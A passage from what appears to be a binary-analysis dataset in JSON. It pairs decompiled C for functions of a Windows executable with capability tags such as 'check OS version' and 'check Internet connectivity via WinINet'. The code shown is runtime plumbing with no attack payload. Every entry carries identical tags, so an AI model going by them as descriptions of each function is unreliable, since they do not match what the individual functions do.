0x41cc00;\n        fcn.0041cc50();\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41cc25;\n    uStack40 = 0x41cc1d;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 630
    },
    "0041d03c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n\nvoid __cdecl fcn.0041d03c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint16_t in_AX;\n    int32_t iVar2;\n    char in_DL;\n    int32_t iVar3;\n    uint var_3h;\n    \n    iVar2 = fcn.0040669c();\n    if (-1 < iVar2 + -1) {\n        iVar3 = 0;\n        do {\n            if (in_DL == '\\0') {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = ~in_AX & *(iVar1 + 0x1c);\n            }\n            else {\n                iVar1 = *(*(arg_8h + -4) + iVar3 * 4);\n                *(iVar1 + 0x1c) = *(iVar1 + 0x1c) | in_AX;\n            }\n            iVar3 = iVar3 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "0041d124": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d124(int32_t arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41d20a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x41d149;\n    iVar2 = fcn.0041ed70();\n    *(arg_8h + -0x14) = 0;\n    if (*(*(arg_8h + -8) + 0x72) != 0) {\n        puStack32 = arg_8h + -0x14;\n        uStack36 = 0x41d17b;\n        (**(*(arg_8h + -8) + 0x70))();\n    }\n    if (*(arg_8h + -0x14) == 0) {\n        puStack32 = 0x41d189;\n        uVar3 = (**(iVar2 + -0xc))();\n        *(arg_8h + -0x14) = uVar3;\n        if ((*(arg_8h + -9) & 4) != 0) {\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 1;\n            puVar1 = *(arg_8h + -0x14) + 0x1c;\n            *puVar1 = *puVar1 | 0x200;\n        }\n        uStack36 = 0x41d1de;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        (**(**(arg_8h + -0x14) + 0x2c))();\n        *in_FS_OFFSET = uStack40;\n    }\n    puVar1 = *(arg_8h + -0x14) + 0x1c;\n    *puVar1 = *puVar1 | 1;\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 539
    },
    "0041d5b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041d5b8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x30) == 0) {\n        puStack16 = 0x41d5d7;\n        uVar1 = fcn.00404610();\n        *(in_EAX + 0x30) = uVar1;\n        uStack20 = 0x41d613;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        fcn.0041d628();\n        fcn.0041cae8();\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x41d624;\n        uStack20 = 0x41d612;\n        fcn.0041cc50();\n        return;\n    }\n    puStack16 = 0x41d624;\n    fcn.0041d628();\n    return;\n}\n",
        "token_count": 258
    },
    "0041da48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041da48(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    int32_t var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    puStack304 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack308 = 0x41db39;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack312;\n    fcn.0040546c();\n    cVar1 = fcn.004047cc();\n    if (cVar1 != '\\0') {\n        fcn.00405504();\n    }\n    if (var_4h == 0) {\n        fcn.00404520();\n        fcn.004056d0();\n    }\n    var_124h = var_4h;\n    var_120h._0_1_ = 0xb;\n    var_11ch = **0x4a4d64;\n    var_118h._0_1_ = 0xb;\n    var_114h = *(arg_8h + -8);\n    var_110h._0_1_ = 0xb;\n    var_10ch = *(in_EAX + 4);\n    var_108h._0_1_ = 0xb;\n    uVar2 = 3;\n    fcn.0040daf0(3, &var_124h);\n    fcn.00404eb4();\n    *in_FS_OFFSET = uVar2;\n    uStack312 = 0x41db40;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 461
    },
    "0041df60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.0041df60(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    unkbyte10 Var4;\n    ulong uVar5;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 5;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x41e26c;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0041df60::var_1ch;\n    puVar1 = &stack0xfffffffc;\n    if (*0x8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (**_pe_dos_header == '\\a') {\n            fcn.004163e8();\n            cVar2 = fcn.004047cc();\n            puVar1 = var_14h;\n            if ((cVar2 != '\\0') && (iVar3 = fcn.004163e8(),  puVar1 = var_14h,  (*(iVar3 + 0x24) & 4) != 0))\n            goto code_r0x0041dfd5;\n        }\n        var_14h = puVar1;\n        fcn.0041c758();\n        puVar1 = var_14h;\n    }\ncode_r0x0041dfd5:\n    var_14h = puVar1;\n    // switch table (17 cases) at 0x41dfef\n    switch(**_pe_dos_header) {\n    case '\\x01':\n        cVar2 = fcn.0041cd3c();\n        if (cVar2 == '\\a') {\n            fcn.0041d84c();\n            fcn.0041ddbc();\n        }\n        else {\n            fcn.0041d948();\n            fcn.0041645c();\n        }\n        break;\n    case '\\x02':\n        fcn.0041cdfc();\n        fcn.0041645c();\n        break;\n    case '\\x03':\n        fcn.0041d84c();\n        fcn.00416314();\n        fcn.0041645c();\n        break;\n    case '\\x04':\n        Var4 = fcn.0041d6f8();\n        var_28h = Var4;\n        var_24h = Var4 >> 0x20;\n        fcn.00416794(var_28h, var_24h, CONCAT22(0x41, Var4 >> 0x40));\n        break;\n    case '\\x05':\n    case '\\n':\n        fcn.0041e728();\n        fcn.0041668c();\n        break;\n    case '\\x06':\n        fcn.0041e60c();\n        fcn.0041645c();\n        break;\n    case '\\a':\n        cVar2 = fcn.0041cd3c();\n        if (cVar2 == '\\r') {\n            fcn.0041e8c8();\n            fcn.0041645c();\n        }\n        else if (cVar2 == '\\x0e') {\n            fcn.0041e8c8();\n            fcn.004163e8();\n            fcn.0041ceb8();\n        }\n        else {\n            fcn.0041d84c();\n            var_24h = 0x41e1b3;\n            fcn.0041de04(&stack0xfffffffc);\n        }\n        break;\n    case '\\b':\n        cVar2 = fcn.0041cd3c();\n        if (cVar2 == '\\r') {\n            fcn.0041e8c8();\n            fcn.004169e0();\n        }\n        else {\n            fcn.0041d84c(0xe8);\n            var_24h = 0x41e1ff;\n            (**(*in_EAX + 0x18))();\n            if (var_14h != NULL) {\n                fcn.004169e0();\n            }\n        }\n        break;\n    case '\\t':\n        fcn.0041ce5c();\n        fcn.0041645c();\n        break;\n    case '\\v':\n        fcn.0041e7e4();\n        fcn.004166bc();\n        break;\n    case '\\f':\n        var_24h = 0x41e21b;\n        fcn.0041de44(&stack0xfffffffc);\n        break;\n    case '\\x0f':\n        var_24h = 0x41e23b;\n        fcn.0041dea0(&stack0xfffffffc);\n        break;\n    case '\\x10':\n        uVar5 = fcn.0041d9b4();\n        var_24h = uVar5;\n        fcn.00416a18(var_24h, uVar5 >> 0x20);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x41e273;\n    fcn.00405490();\n    fcn.00405c48();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 1264
    },
    "0041e2d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e2d8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint uStackY128;\n    uint uStackY124;\n    uchar *puStackY120;\n    uint uStackY116;\n    uint uStackY112;\n    uchar *puStackY108;\n    uint arg_8h;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack92 = &stack0xfffffffc;\n    uStack72 = 0x41e5f9;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x41e311;\n    fcn.0041e6c8();\n    puStack80 = 0x41e320;\n    (**(**0x4aa9b0 + 0x14))();\n    uStack84 = 0x41e5d7;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    uStack96 = 0x41e598;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack80 = &stack0xfffffffc;\n    (**(*in_EAX + 0x28))();\n    if (param_2 == NULL) {\n        fcn.0041e6ec();\n        iVar1 = fcn.00418d70();\n        var_ch = (**(iVar1 + 0x2c))();\n        fcn.0041e6ec();\n        (**(*var_ch + 0x18))();\n    }\n    else {\n        fcn.0041e6ec();\n        var_ch = param_2;\n        if ((*(param_2 + 7) & 0x10) == 0) {\n            *(param_2 + 7) = *(param_2 + 7) | 1;\n            *(param_2 + 7) = *(param_2 + 7) | 2;\n            fcn.0041e6ec();\n            fcn.0041e278();\n            (**(*param_2 + 0x18))();\n        }\n        else {\n            fcn.0041e6ec();\n        }\n    }\n    in_EAX[6] = var_ch;\n    arg_8h = 1;\n    puStackY108 = 0x41e3f0;\n    fcn.00404518();\n    puStackY108 = 0x41e3fe;\n    iVar1 = fcn.00418ac0(arg_8h);\n    in_EAX[0x21] = iVar1;\n    uStackY112 = 0x41e53d;\n    uStackY116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    in_EAX[7] = var_ch;\n    puStackY120 = 0x41e423;\n    puStackY108 = &stack0xfffffffc;\n    iVar1 = fcn.004075b8();\n    iVar1 = *(iVar1 + 8);\n    if (iVar1 == 0) {\n        puStackY120 = 0x41e449;\n        iVar2 = fcn.00404610();\n        in_EAX[0xd] = iVar2;\n    }\n    else {\n        in_EAX[0xd] = iVar1;\n    }\n    uStackY124 = 0x41e51a;\n    uStackY128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    puStackY120 = &stack0xfffffffc;\n    iVar2 = fcn.0041966c();\n    if (iVar2 < 0) {\n        fcn.004194b8();\n    }\n    in_EAX[10] = in_EAX[6];\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 1;\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) | 2;\n    (**(*in_EAX[6] + 0x14))();\n    *(in_EAX[6] + 0x1c) = *(in_EAX[6] + 0x1c) & 0xfffd;\n    if ((iVar1 == 0) && (iVar2 = *(in_EAX[0xd] + 8),  -1 < iVar2 + -1)) {\n        do {\n            piVar3 = fcn.00419610();\n            (**(*piVar3 + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStackY128;\n    puStackY120 = 0x41e521;\n    if (iVar1 == 0) {\n        uStackY124 = 0x41e511;\n        fcn.00404640();\n    }\n    in_EAX[0xd] = 0;\n    return;\n}\n",
        "token_count": 1293
    },
    "0041e60c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041e66b)\n// WARNING: Removing unreachable block (ram,0x0041e67a)\n\nvoid fcn.0041e60c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x41e6b6;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x41e689;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    cVar1 = fcn.0041e8c8();\n    if (cVar1 != '\\v') {\n        fcn.0041c770();\n    }\n    fcn.004162bc();\n    fcn.0041e6ec();\n    *in_FS_OFFSET = uStack48;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41e6bd;\n    uStack32 = 0x41e6b5;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 321
    },
    "0041e8dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041e8dc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uStack20 = 0x41e918;\n    fcn.0041e6ec();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41e91f;\n    uStack20 = 0x41e917;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 151
    },
    "0041ec78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041ec78(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    fcn.00405504();\n    var_8h = 0;\n    if (*(in_EAX + 0x1c) != 0) {\n        var_8h = fcn.0041fb90();\n    }\n    if (var_8h == 0) {\n        if (*(in_EAX + 0x5a) != 0) {\n            (**(in_EAX + 0x58))(&var_8h, param_1);\n        }\n        if (var_8h == 0) {\n            var_10h = var_4h;\n            var_ch._0_1_ = 0xb;\n            uVar1 = 0;\n            fcn.0040daf0(0, &var_10h);\n            fcn.00404eb4();\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 311
    },
    "0041ed70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0041ed70(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack12;\n    \n    iStack12 = fcn.0041cc8c();\n    if (((iStack12 == 0) && (*(in_EAX + 0x1c) != 0)) && (*(in_EAX + 0x1c) != *(in_EAX + 0x18))) {\n        iStack12 = fcn.0041cc8c();\n    }\n    if (*(in_EAX + 0x6a) != 0) {\n        (**(in_EAX + 0x68))(&iStack12);\n    }\n    if (iStack12 != 0) {\n        cVar1 = fcn.0040486c();\n        if (cVar1 != '\\0') goto code_r0x0041edda;\n    }\n    fcn.00418cb0();\ncode_r0x0041edda:\n    return CONCAT44(iStack12, iStack12);\n}\n",
        "token_count": 229
    },
    "0041f424": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f424(void)\n\n{\n    sub.kernel32.dll_InitializeCriticalSection(0x4aa9d0);\n    *0x4aa9b8 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0, 0x41f454);\n    if (*0x4aa9b8 == 0) {\n        fcn.0040f168();\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "0041f498": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041f498(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStackY108;\n    uint uStackY104;\n    uchar *puStackY100;\n    uint uStackY96;\n    uint uStackY92;\n    uchar *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint uStackY76;\n    uchar *puStackY72;\n    uint uStackY68;\n    uint uStackY64;\n    uint uStackY60;\n    uint uStackY56;\n    uchar *puStackY52;\n    uint uStackY48;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    puStackY100 = &fcn.0041f498::var_1h + 1;\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != **0x4a5170) {\n        var_14h = sub.kernel32.dll_GetCurrentThreadId_1();\n        var_10h._0_1_ = 0;\n        uStackY48 = 0x41f4d6;\n        fcn.0040daf0(0, &fcn.0041f498::var_14h);\n        uStackY48 = 0x41f4db;\n        fcn.00404eb4();\n    }\n    if (in_EAX < 1) {\n        uStackY48 = 0x41f4ed;\n        fcn.0041f470();\n    }\n    else {\n        uStackY48 = 0x41f4e6;\n        fcn.0041f47c();\n    }\n    var_ch = 0;\n    uStackY48 = 0x4aa9d0;\n    puStackY52 = 0x41f4fc;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStackY56 = 0x41f65d;\n    uStackY60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uStackY64 = var_ch;\n    uStackY68 = 0x4a1b24;\n    puStackY72 = 0x41f518;\n    puStackY52 = &fcn.0041f498::var_1h + 1;\n    var_ch = sub.kernel32.dll_InterlockedExchange();\n    uStackY76 = 0x41f63e;\n    uStackY80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if ((var_ch == 0) || (*(var_ch + 8) < 1)) {\n        var_1h._0_1_ = '\\0';\n    }\n    else {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((var_1h != '\\0') && (0 < *(var_ch + 8))) {\n        uStackY84 = 0x41f55a;\n        puStackY72 = &fcn.0041f498::var_1h + 1;\n        var_8h = fcn.00419610();\n        uStackY84 = 0x41f567;\n        fcn.00419504();\n        uStackY84 = 0x4aa9d0;\n        puStackY88 = 0x41f571;\n        sub.kernel32.dll_LeaveCriticalSection();\n        uStackY92 = 0x41f5e1;\n        uStackY96 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa0;\n        uStackY104 = 0x41f5a2;\n        uStackY108 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff94;\n        puStackY88 = &fcn.0041f498::var_1h + 1;\n        (**(*var_8h + 8))();\n        *in_FS_OFFSET = uStackY108;\n        *in_FS_OFFSET = uStackY96;\n        puStackY88 = 0x41f5e8;\n        uStackY92 = 0x4aa9d0;\n        uStackY96 = 0x41f5e0;\n        sub.kernel32.dll_EnterCriticalSection();\n        return;\n    }\n    *in_FS_OFFSET = uStackY80;\n    puStackY72 = 0x41f645;\n    uStackY76 = 0x41f63d;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 1046
    },
    "0041f6bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f6bc(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a0c();\n    fcn.0041f924();\n    if (*(iVar1 + 0x14) != 0) {\n        while ((*(iVar1 + 0x14) != 0 && (0 < *(*(iVar1 + 0x14) + 8)))) {\n            piVar2 = fcn.00419610();\n            (**(*piVar2 + 0x10))();\n        }\n        fcn.0040f840();\n    }\n    fcn.0041f8c8();\n    if (*(iVar1 + 4) != 0) {\n        fcn.0041f890();\n    }\n    fcn.00419b8c();\n    if ('\\0' < extraout_DL) {\n        fcn.004049b4();\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "0041f744": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f744(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 4) == 0) || (*(in_EAX + 4) != *(param_2 + 4))) {\n        if (*(in_EAX + 0x14) == 0) {\n            uVar1 = fcn.00404610();\n            *(in_EAX + 0x14) = uVar1;\n        }\n        iVar2 = fcn.0041966c();\n        if (iVar2 < 0) {\n            fcn.004194b8();\n            fcn.0041f744();\n        }\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x100;\n    return;\n}\n",
        "token_count": 205
    },
    "0041f7d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f7d8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        uVar1 = fcn.00404610();\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.004194b8();\n    *(param_2 + 4) = in_EAX;\n    return;\n}\n",
        "token_count": 115
    },
    "0041f804": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f804(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 4) = 0;\n    fcn.00419754();\n    if (*(*(in_EAX + 0x10) + 8) == 0) {\n        fcn.00404640();\n        *(in_EAX + 0x10) = 0;\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "0041f960": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041f960(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        fcn.00419754();\n        if (*(*(in_EAX + 0x14) + 8) == 0) {\n            fcn.00404640();\n            *(in_EAX + 0x14) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0041faf8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041faf8(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        cVar1 = fcn.00409980();\n        if ((cVar1 == '\\0') && (in_EAX == *(in_EDX + 4))) {\n            iVar2 = fcn.0041fb90();\n            if (iVar2 != 0) {\n                var_ch = arg_8h;\n                var_8h._0_1_ = 0xb;\n                fcn.0040daf0(0, &var_ch);\n                fcn.00404eb4();\n            }\n        }\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 4) != 0)) {\n        (**(**(in_EAX + 4) + 0x20))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 267
    },
    "0041fb90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041fb90(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (((param_2 != 0) && (*(in_EAX + 0x10) != 0)) && (iVar3 = *(*(in_EAX + 0x10) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.00419610();\n            cVar1 = fcn.00409980();\n            if (cVar1 != '\\0') goto code_r0x0041fbd5;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    uVar2 = 0;\ncode_r0x0041fbd5:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 209
    },
    "0041fc84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
